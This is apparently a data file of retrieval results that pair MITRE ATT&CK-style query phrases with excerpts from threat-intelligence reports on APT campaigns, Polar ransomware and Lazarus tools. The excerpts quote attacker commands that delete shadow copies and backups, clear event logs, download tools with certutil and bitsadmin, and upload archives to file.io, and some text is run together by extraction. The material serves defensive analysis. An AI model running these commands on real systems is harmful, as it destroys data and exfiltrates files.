munities,insomecaseswecontactedtargetedgroupsdirectly; identified overlap between the campaigns; targets of FinSpy inothers,wereachedouttoindividualswithconnectionstotar- appearedtoresidemainlyoutsideBahrain,whereastheIPspy getedgroups,whoallowedustoexaminetheircommunications links targeted those mainly inside the country.', 'We examine withthegroups.ForBahrainandSyria,theworkencompassed eachcampaigninturn.', '10,000sofe-mailsandinstantmessages.FortheUAE,thevol- umeisseveralthousandcommunications.']
Valid Accounts: Domain Accounts|0.8003464768737285|['Do they see that the top 60 most targeted victims in our dataset evolveintimeandifso,howquicklydotheyadapt receivedmaliciousemailsoftenoverthelastfouryears.', 'tonewdefensemechanisms?', '(We note that the dataset shared by one of our volun- teersstartsonAugust2012,explainingwhyweobserve What is the efficacy of existing countermeasures?', 'moremaliciousemailsafterthatdate.)', 'Wealsoseethat, As all malicious documents in our dataset used 31emailaccountsfromindividualswithoutaffiliationto well-known vulnerabilities, would commercial, WUC were often targeted simultaneously to the WUC state-of-the-artdefenseshavedetectedallofthem?', 'accounts.', '7 USENIX Association 23rd USENIX Security Symposium 549Targeted vulnerabilities 60 50 40 30 20 10 0 200909 201009 201109 201209 201309 Time 550 23rd USENIX Security Symposium USENIX Association stnemucod suoicilam fo rebmuN Targeted applications 60 Unknown Others 50 20062492 20093129 40 20103333 20120158 30 20 10 0 200909 201009 201109 201209 201309 Time stnemucod suoicilam fo rebmuN Office Acrobat Figure8: Numberofmaliciousdocumentscontainingagivenvulnerability(CVE)(left)andtargetapplication(right) for each month of our dataset.', 'We represent the top four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate.', 'The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader.', 'Although Acrobat Reader was the most targeted application until 2010, recent attacksmainlytargettheOfficesuite.', '4.1 Methodology our taint-assisted manual analysis are described in Ap- pendixB.']
Valid Accounts: Domain Accounts|0.8003464768737285|['Often, the request comes with a sob story or other emotion intended to manipulate the help desk worker.', 'This attack only takes a few minutes.', 'Muddled Libra is unusually comfortable with engaging over the telephone, with both help desk and other employees.', 'They are more successful in persuading people to engage in unsafe actions as a result.', 'Often, they will acquire initial access by taking over a less-privileged legitimate user account.', 'Then, they identify the more highly privileged accounts that will help them achieve their objectives and call back to take over those accounts.', 'In one case that Unit 42 worked, the attackers successfully hoodwinked the help desk three separate times.', 'Muddled Libra also buys stolen credentials from initial access brokers.', 'The threat group has been very open about their desire to buy access to certain targets, especially in the segments they have chosen.', '10Spotlight On: Muddled Libra Incident Response Report 2024 And if these social engineering access methods Why Is It So Hard to Eject This dont work, Muddled Libra also has technical Threat Actor?', 'tactics to use as well.']
Valid Accounts: Domain Accounts|0.8003464768737285|"['Convenience (1%) and Ideology (1%).', 'Whereas Financial attacksif not detected while occurring or soon thereaftereventually become apparent when money goes missing.', 'At that point, the Financial motive, if not already ascertained, can be determined.', '100% 80% Financial 60% 40% Espionage 20% 0% 2014 2015 2016 2017 2018 2019 2020 (n=1,141) (n=1,208) (n=1,419) (n=1,552) (n=2,089) (n=1,320) (n=1,134) Figure #36: Actor motives over time within all breaches (2014-2020 DBIR) 0% 20% 40% 60% 80% 100% 0% 20% 40% 60% 80% 100% Financial Financial 86% 76% Espionage Espionage 10% 18% Grudge Fun 2% 3% Fun Grudge 1% 1% Convenience Convenience 1% 1% Ideology Ideology 1% 1% Figure #37: Actor motives within all breaches Figure #38: Actor motives within all breaches (2020 DBIR; n=1,141) (2014-2020 DBIR; n=9,863) 24 2020-2021 Cyber-Espionage ReportProactive defense: The best defense is a great offense.', 'Threat hunting | Additional actions Behavioral analysis Consider taking these additional Advanced threat actors attempt protective measures: to blend in to evade automated cyberdefense measures.', 'With the rise Assign all users separate, unique of zero-day and fileless attacks, its accounts.', 'Dont use generic or harder than ever to protect endpoints shared accounts or passwords with confidence.', 'In addition, preventing Block outbound, unrestricted internet and detecting these attacks can be a access from server infrastructure.', 'huge drain on organizational resources.', 'This is intended to prevent adversaries from exfiltrating data to Compromise happens within minutes known or unknown IP addresses and to hours, as we have seen consistently using services, protocols or ports in over the years in the DBIR.', 'This is mainly an unauthorized manner attributable to the use of email and web-based threat vectors coupled with Create adequate network heavily automated attacks (nowadays segmentation to separate virtual local also powered by machine learning).']"
is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run|0.7814029933414969|"['Here we have provided a timeline to better show the sequence of events.', ""https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 3/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 4/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 5/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 6/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 7/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction CSIRT's objectives included recovering the client's data, which included key information belonging to different departments."", 'We performed analysis of the encryption malware and were able to recover the lost files.', 'Polar ransomware The method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.', ""Three files are sent to the victim's computer: GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft."", 'GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 8/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate application is known as DLL hijacking.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 9/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.']"
payload and intermediate library are deleted before completion|0.9960846810213893|"['GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 8/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate application is known as DLL hijacking.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 9/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 10/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail."", 'Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET.']"
payload and intermediate library are deleted before completion|0.9960846810213893|"[""While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success.Here we have provided a timeline to better show the sequence of events.CSIRT's objectives included recovering the client's data, which included key information belonging to different departments."", 'We performed analysis of the encryption malware and were able to recover the lost files.Polar ransomwareThe method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.', ""Three files are sent to the victim's computer:GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft.GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported."", 'This frequently used technique of loading malicious code in the context of a legitimate application is known asDLL hijacking.The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', ""Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten.Sysurl.Hex is an encrypted copy of the Polar ransomware.This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run thePlugXbackdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union.Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail.Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET."", 'The compilation date is April 9, 2020.', 'The code entry point is the Actions method of the Encode class in the Polar name space (which is the name we have used for the malware family).The malware deletes system event logs and shadow copies by performing the following commands:dism /online /enable-feature /featurename:NetFx3 vssadmin.exe Delete Shadows /All /Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackupIt then looks for and stops the following processes:agntsvc.exeagntsvc.exeagntsvc.exeagntsvc.exedbeng50.exedbsnmp.exeencsvc.exeexcel.exefirefoxconfig.exeinfopath.exeisqlplussvc.exemsaccess.exemsftesql.exemspub.exemydesktopqos.exemydesktopservice.exemysqld-nt.exemysqld-opt.exemysqld.exenotepad++.exenotepad.exeocautoupds.exeocomm.exeocssd.exeonenote.exeoracle.exeoutlook.exepowerpnt.exesqbcoreservice.exesqlagent.exesqlbrowser.exesqlservr.exesqlwriter.exesteam.exesynctime.exetbirdconfig.exethebat.exethebat64.exethunderbird.exevisio.exewinword.exewordpad.exexfssvccon.exeThen the malware gets a list of connected disks and starts recursive traversal of directories, skipping a few of them:C:\\\\WindowsC:\\\\Program FilesC:\\\\Program Files (x86)C:\\\\ProgramDataC:\\\\Python$SysReset$Recycle.Bin$RECYCLE.BINIt cares only about files with the following extensions:.3dm.3ds.3g2.3gp.7z.accdb.ai.aif.asf.asp.aspx.avi.bak.bin.bmp.c.cbr.cer.cfm.class.cpp.crdownload.cs.csr.css.csv.cue.dat.db.dbf.dds.deb.dmg.dmp.doc.docx.dtd.dwg.dxf.eps.fla.flv.ged.gif.gz.h.html.ics.iff.indd.ini.iso.java.jpg.js.jsp.key.keychain.log.lua.m.m3u.m4a.m4v.max.mdb.mdf.mid.mov.mp3.mp4.mpa.mpg.msg.msi.obj.odt.pages.part.pct.pdb.pdf.php.pkg.pl.png.pps.ppt.pptx.ps.psd.py.rar.rm.rpm.rss.rtf.sdf.sh.sitx.sln.sql.srt.svg.swf.swift.tar.tar.gz.tax2014.tax2015.tex.tga.thm.tif.tiff.tmp.toast.torrent.txt.vb.vcd.vcf.vcxproj.vob.wav.wma.wmv.wpd.wps.xcodeproj.xhtml.xlr.xls.xlsx.xml.yuv.zip.zipxBefore starting encryption, the malware creates what we will call a base encryption key consisting of eight randomly chosen characters from the following alphabet: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/Two approaches to encryption are used, depending on the file size.', 'Each approach involves a different encryption key.', 'The base encryption key is used in both approaches, however.First we will look at the approach for encryption of files with size less than 64,052,000 bytes (approximately 61 MB).']"
yielding a PE file that is loaded and run in memory with .NET.|0.8503540056220592|"[""Three files are sent to the victim's computer: GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft."", 'GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 8/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported.', 'This frequently used technique of loading malicious code in the context of a legitimate application is known as DLL hijacking.', 'https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 9/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', 'Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten.', 'Sysurl.Hex is an encrypted copy of the Polar ransomware.', 'This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/incident-response-polar-ransomware-apt27/ 10/2311/30/2020 Investigation with a twist: an accidental APT attack and averted data destruction TA459, and Bronze Union.', ""Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail.""]"
yielding a PE file that is loaded and run in memory with .NET.|0.8503540056220592|"['This time, they deleted OS logs and stopped Shadow Copy services, complicating subsequent incident analysis.For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.', ""While our specialists were assisting the client in May 2020, the attackers made yet another attempt to regain control of infrastructure with the help of web shells that were still in place on the network of the headquarters and office, but this time to no success.Here we have provided a timeline to better show the sequence of events.CSIRT's objectives included recovering the client's data, which included key information belonging to different departments."", 'We performed analysis of the encryption malware and were able to recover the lost files.Polar ransomwareThe method used to run the ransomware is classic and, indeed, characteristic of certain Asian groups.', ""Three files are sent to the victim's computer:GDFInstall.exe (MD5: 13435101240f78367123ef01a938c560) is a legitimate computer game component signed by Ubisoft.GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.This component is not actually legitimate, however: attacker code is executed after the GameExplorerInstallW symbol is exported."", 'This frequently used technique of loading malicious code in the context of a legitimate application is known asDLL hijacking.The file c:\\\\programdata\\\\Sysurl.Hex is read (after being copied from c:\\\\windows\\\\system32\\\\Sysurl.Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.', 'The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.', 'The payload and intermediate library are deleted before completion.', ""Deletion occurs in the standard (insecure) way, which enables recovering the data if disk access is stopped in time and the information has not been overwritten.Sysurl.Hex is an encrypted copy of the Polar ransomware.This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run thePlugXbackdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union.Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail.Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET."", 'The compilation date is April 9, 2020.', 'The code entry point is the Actions method of the Encode class in the Polar name space (which is the name we have used for the malware family).The malware deletes system event logs and shadow copies by performing the following commands:dism /online /enable-feature /featurename:NetFx3 vssadmin.exe Delete Shadows /All /Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackupIt then looks for and stops the following processes:agntsvc.exeagntsvc.exeagntsvc.exeagntsvc.exedbeng50.exedbsnmp.exeencsvc.exeexcel.exefirefoxconfig.exeinfopath.exeisqlplussvc.exemsaccess.exemsftesql.exemspub.exemydesktopqos.exemydesktopservice.exemysqld-nt.exemysqld-opt.exemysqld.exenotepad++.exenotepad.exeocautoupds.exeocomm.exeocssd.exeonenote.exeoracle.exeoutlook.exepowerpnt.exesqbcoreservice.exesqlagent.exesqlbrowser.exesqlservr.exesqlwriter.exesteam.exesynctime.exetbirdconfig.exethebat.exethebat64.exethunderbird.exevisio.exewinword.exewordpad.exexfssvccon.exeThen the malware gets a list of connected disks and starts recursive traversal of directories, skipping a few of them:C:\\\\WindowsC:\\\\Program FilesC:\\\\Program Files (x86)C:\\\\ProgramDataC:\\\\Python$SysReset$Recycle.Bin$RECYCLE.BINIt cares only about files with the following extensions:.3dm.3ds.3g2.3gp.7z.accdb.ai.aif.asf.asp.aspx.avi.bak.bin.bmp.c.cbr.cer.cfm.class.cpp.crdownload.cs.csr.css.csv.cue.dat.db.dbf.dds.deb.dmg.dmp.doc.docx.dtd.dwg.dxf.eps.fla.flv.ged.gif.gz.h.html.ics.iff.indd.ini.iso.java.jpg.js.jsp.key.keychain.log.lua.m.m3u.m4a.m4v.max.mdb.mdf.mid.mov.mp3.mp4.mpa.mpg.msg.msi.obj.odt.pages.part.pct.pdb.pdf.php.pkg.pl.png.pps.ppt.pptx.ps.psd.py.rar.rm.rpm.rss.rtf.sdf.sh.sitx.sln.sql.srt.svg.swf.swift.tar.tar.gz.tax2014.tax2015.tex.tga.thm.tif.tiff.tmp.toast.torrent.txt.vb.vcd.vcf.vcxproj.vob.wav.wma.wmv.wpd.wps.xcodeproj.xhtml.xlr.xls.xlsx.xml.yuv.zip.zipxBefore starting encryption, the malware creates what we will call a base encryption key consisting of eight randomly chosen characters from the following alphabet: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/Two approaches to encryption are used, depending on the file size.', 'Each approach involves a different encryption key.']"
"""cmd.exe"|0.8104175652537835|"['The malware then creates the directory %APPDATA%\\\\DameWareNT.', 'If the creation of this directory fails, the malware uses the directory %TEMP%\\\\DameWareNT instead.', 'In the newly-created DameWareNT folder, a file named data_0 is created.', 'The file contains a VictimID string, which consists of eight random characters.', 'If the file already exists, it is cleared, with the exception of the first line, retaining the previously created VictimID.', ""Next, the following commands are appended to the file, encrypted using XOR key 0xA5: cmd.exe /c ipconfig /all cmd.exe /c tasklist /svc cmd.exe /c netstat -ano cmd.exe /c systeminfo cmd.exe /c arp -a cmd.exe /c net use cmd.exe /c net user /domain cmd.exe /c net group /domain cmd.exe /c query user Finally, the malware starts two threads: The malware's first thread runs a check every three seconds to determine if the number of connected removable drives has changed."", 'If a change is detected, the following actions are performed: The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the : character in the file name indicates that NTFS alternate data streams are used) or the file System Volume Information\\\\_WFConfig.log (in case of a FAT-formatted drive).', 'If found, the data in the file is appended to the contents of the data_0 file.', 'Files with the .res extension in the DameWareNT directory are scanned, and their contents are copied to the removable drive in a file named either desktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume Information_WTSettings_%VictimID%.log (for FAT).', 'The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System Volume Information_WRConfig_%VictimID%.log (for FAT).', 'If found, the data in the file is added to the contents of the data_0 file.']"
"""cmd.exe"|1.0|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"""cmd.exe"|0.8886415531257763|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
"""cmd.exe"|0.7970209500418814|"['It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed suggesting this is all part of the same campaign.', 'Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These commands are as follows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is seen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Host: www.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.', ']in as a C&C channel but instead was downloaded from the URL: hxxps://www.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
"""cmd.exe"|0.8352002528474389|"['Modular architecture of the victims infection process provides both additional flexibility and anonymity throughout the cyber-attack.', 'This scheme allows hackers to divide software development activity between teams, as well as to ensure the reuse of program code.', 'Recon Performs initial reconnaissance to determine if a systems is of interest to the threat actors Dropper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TrafficForwarder and injects into the legitimate process Client_TrafficForwarder Forwards operators commands from external network into corporate network Client_RAT Provides full control over the target system Recon is a backdoor that is initially installed on the target machine through successful execution of exploits.', 'This module is used by hackers to perform initial reconnaissance to search for systems of interest.', 'Once launched, the program adds itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\ Start Menu\\\\Programs\\\\Startup"", collects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data collected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\ CurrentVersion\\\\Internet Settings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tools, attribution1 Key 2 Attack 3 Attack 4 Recommendations 5 Indicators of 6 Appendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module will use the ""killkill"" command to remove itself from the infected system.', 'If the system is of interest, then Recon downloads 